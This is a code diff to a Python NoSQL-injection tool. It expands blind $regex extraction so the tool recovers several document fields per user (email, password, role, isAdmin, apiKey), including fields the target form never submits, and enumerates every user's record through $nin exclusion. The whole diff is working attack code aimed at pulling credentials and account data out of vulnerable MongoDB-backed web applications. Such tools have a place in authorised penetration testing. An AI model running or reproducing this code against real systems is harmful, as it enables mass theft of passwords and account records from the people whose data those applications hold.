@@ -41,10 +41,10 @@ _CHARSET_FULL = _CHARSET_DEFAULT + "?/\\|~^()[]{}<>:;,'\"=`"
 
 def args():
     return [
-        ["--extract", "After confirming injection, blind-extract this field's value via $regex (e.g. password)"],
+        ["--extract", "Blind-extract these comma-separated document fields via $regex (e.g. email,password,role,isAdmin); fields need not be submitted by the form; multiple fields are pinned to one user"],
         ["--extractCharset", "Extraction charset: alnum, default, or full"],
         ["--extractMax", "Max characters to extract per value (default 64)"],
-        ["--extractUsers", "Enumerate multiple values via $nin exclusion (y/n)"],
+        ["--extractUsers", "Enumerate ALL users via $nin exclusion, not just the first (y/n)"],
     ]
 
 
@@ -239,13 +239,23 @@ def _regex_ops(pattern, exclude):
     return d
 
 
-def _extract_probe(method, url, vector, fields_literal, field, pattern, headers, verify, exclude=None):
+def _extract_probe(method, url, vector, fields_literal, field, pattern, headers, verify,
+                   exclude=None, pin=None):
+    pin = pin or {}
     spec = {}
+    # Submitted fields default to always-true companions.
     for n in fields_literal:
-        if n == field:
-            spec[n] = ("ops", _regex_ops(pattern, exclude))
-        else:
-            spec[n] = ("op", "$ne", _rand())   # force companion clauses always-true
+        spec[n] = ("op", "$ne", _rand())
+    # Pin already-recovered fields (which may include non-submitted ones) so the
+    # whole record stays one user.
+    for n, val in pin.items():
+        if n != field:
+            spec[n] = ("lit", val)
+    # The field under extraction.  This may be an arbitrary document field the
+    # form never submits (role, isAdmin, apiKey, ...): adding it as its own
+    # operator constraint extracts it when the app queries by the request body
+    # (e.g. Mongoose find(req.body) / find($_POST)).
+    spec[field] = ("ops", _regex_ops(pattern, exclude))
     return _send(method, url, vector, spec, headers, verify)
 
 
@@ -268,14 +278,14 @@ def _classify_true(probe, true_sig, false_sig):
 
 
 def extract(base_url, method, vector, fields_literal, field, headers=None, verify=False,
-            charset=None, maxlen=64, exclude=None):
+            charset=None, maxlen=64, exclude=None, pin=None):
     method = method.upper()
     charset = charset or _CHARSET_DEFAULT
     # TRUE/FALSE references with the SAME query shape, only the regex differs,
     # so the regex match is the only variable.
     try:
-        true_sig = _extract_probe(method, base_url, vector, fields_literal, field, ".*", headers, verify, exclude)
-        false_sig = _extract_probe(method, base_url, vector, fields_literal, field, "^" + _rand(16) + "$", headers, verify, exclude)
+        true_sig = _extract_probe(method, base_url, vector, fields_literal, field, ".*", headers, verify, exclude, pin)
+        false_sig = _extract_probe(method, base_url, vector, fields_literal, field, "^" + _rand(16) + "$", headers, verify, exclude, pin)
     except requests.RequestException as e:
         print("    extraction error: %s" % e)
         return None
@@ -288,7 +298,7 @@ def extract(base_url, method, vector, fields_literal, field, headers=None, verif
         for c in charset:
             pat = "^" + re.escape(value + c)
             try:
-                p = _extract_probe(method, base_url, vector, fields_literal, field, pat, headers, verify, exclude)
+                p = _extract_probe(method, base_url, vector, fields_literal, field, pat, headers, verify, exclude, pin)
             except requests.RequestException:
                 continue
             if _classify_true(p, true_sig, false_sig):
@@ -300,6 +310,44 @@ def extract(base_url, method, vector, fields_literal, field, headers=None, verif
             break
     print("")
     return value
+
+
+def extract_record(base_url, method, vector, fields_literal, field_list, headers=None,
+                   verify=False, charset=None, maxlen=64, exclude_first=None):
+    # Extract each field in order, pinning the ones already recovered so the whole
+    # record belongs to ONE user.  exclude_first applies $nin on the first field
+    # (used to skip users already enumerated).
+    record = {}
+    pin = {}
+    for i, f in enumerate(field_list):
+        v = extract(base_url, method, vector, fields_literal, f, headers, verify,
+                    charset, maxlen, exclude=(exclude_first if i == 0 else None), pin=dict(pin))
+        record[f] = v
+        if i == 0 and v is None:
+            break                      # no (more) matching users -> stop this record
+        if v is not None:
+            pin[f] = v
+    return record
+
+
+def extract_records(base_url, method, vector, fields_literal, field_list, headers=None,
+                    verify=False, charset=None, maxlen=64):
+    # Enumerate every distinct user: walk the first field with $nin, and for each
+    # value pin it and recover the remaining fields.
+    records = []
+    seen = []
+    while True:
+        rec = extract_record(base_url, method, vector, fields_literal, field_list,
+                             headers, verify, charset, maxlen, exclude_first=list(seen))
+        first = field_list[0]
+        v0 = rec.get(first)
+        if not v0 or v0 in seen:
+            break
+        seen.append(v0)
+        records.append(rec)
+        print("    [+] record %d: %s" % (len(records),
+              ", ".join("%s=%s" % (k, rec[k]) for k in field_list)))
+    return records
 
 
 def extract_users(base_url, method, vector, fields_literal, field, headers=None, verify=False,
@@ -318,14 +366,14 @@ def extract_users(base_url, method, vector, fields_literal, field, headers=None,
 def _maybe_extract(strong, base_url, method, fields_literal, headers, verify, args):
     if not strong:
         return
-    field = None
+    raw = None
     multi = False
     charset = _CHARSET_DEFAULT
     maxlen = 64
 
     if args is not None:
-        field = getattr(args, "extract", None)
-        if not field:
+        raw = getattr(args, "extract", None)
+        if not raw:
             return
         cs = (getattr(args, "extractCharset", None) or "default").lower()
         charset = {"alnum": _CHARSET_ALNUM, "full": _CHARSET_FULL}.get(cs, _CHARSET_DEFAULT)
@@ -335,27 +383,45 @@ def _maybe_extract(strong, base_url, method, fields_literal, headers, verify, ar
             maxlen = 64
         multi = str(getattr(args, "extractUsers", "") or "").lower() == "y"
     else:
-        if input("\nBlind-extract a field's value via $regex? (y/n) ").lower() != "y":
+        if input("\nBlind-extract field value(s) via $regex? (y/n) ").lower() != "y":
             return
-        field = input("Field to extract (e.g. password): ").strip()
-        multi = input("Enumerate multiple values via $nin? (y/n) ").lower() == "y"
+        raw = input("Field(s) to extract, comma-separated (e.g. email,password): ").strip()
+        multi = input("Enumerate ALL users, not just the first? (y/n) ").lower() == "y"
 
-    if field not in fields_literal:
-        print("Field '%s' is not one of: %s" % (field, ", ".join(fields_literal)))
+    field_list = [f.strip() for f in raw.split(",") if f.strip()]
+    if not field_list:
+        print("No fields specified to extract.")
         return
+    extra = [f for f in field_list if f not in fields_literal]
+    if extra:
+        print("Note: %s not submitted by the form; trying as extra document field(s) "
+              "(works when the app queries by the request body)." % ", ".join(extra))
 
     vector = strong[0]["vector"]
-    print("\n[*] Blind-extracting '%s' via %s vector (charset=%d, max=%d)..."
-          % (field, vector, len(charset), maxlen))
+    print("\n[*] Blind-extracting %s via %s vector (charset=%d, max=%d)..."
+          % (field_list, vector, len(charset), maxlen))
+
     if multi:
-        vals = extract_users(base_url, method, vector, fields_literal, field, headers, verify, charset, maxlen)
-        print("[+] Recovered %d value(s) for '%s': %s" % (len(vals), field, ", ".join(vals) if vals else "(none)"))
-    else:
-        v = extract(base_url, method, vector, fields_literal, field, headers, verify, charset, maxlen)
-        if v:
-            print("[+] %s = %s" % (field, v))
+        if len(field_list) == 1:
+            vals = extract_users(base_url, method, vector, fields_literal, field_list[0], headers, verify, charset, maxlen)
+            print("[+] Recovered %d value(s): %s" % (len(vals), ", ".join(vals) if vals else "(none)"))
         else:
-            print("[-] Could not establish a usable boolean oracle for extraction.")
+            recs = extract_records(base_url, method, vector, fields_literal, field_list, headers, verify, charset, maxlen)
+            print("[+] Recovered %d record(s):" % len(recs))
+            for r in recs:
+                print("    " + ", ".join("%s=%s" % (k, r.get(k)) for k in field_list))
+    else:
+        if len(field_list) == 1:
+            v = extract(base_url, method, vector, fields_literal, field_list[0], headers, verify, charset, maxlen)
+            if v:
+                print("[+] %s = %s" % (field_list[0], v))
+            else:
+                print("[-] Could not establish a usable boolean oracle for extraction.")
+        else:
+            rec = extract_record(base_url, method, vector, fields_literal, field_list, headers, verify, charset, maxlen)
+            print("[+] Recovered record (one user):")
+            for k in field_list:
+                print("    %s = %s" % (k, rec.get(k)))
 
 
 def run(base_url, method, fields_literal, headers=None, verify=False, args=None):
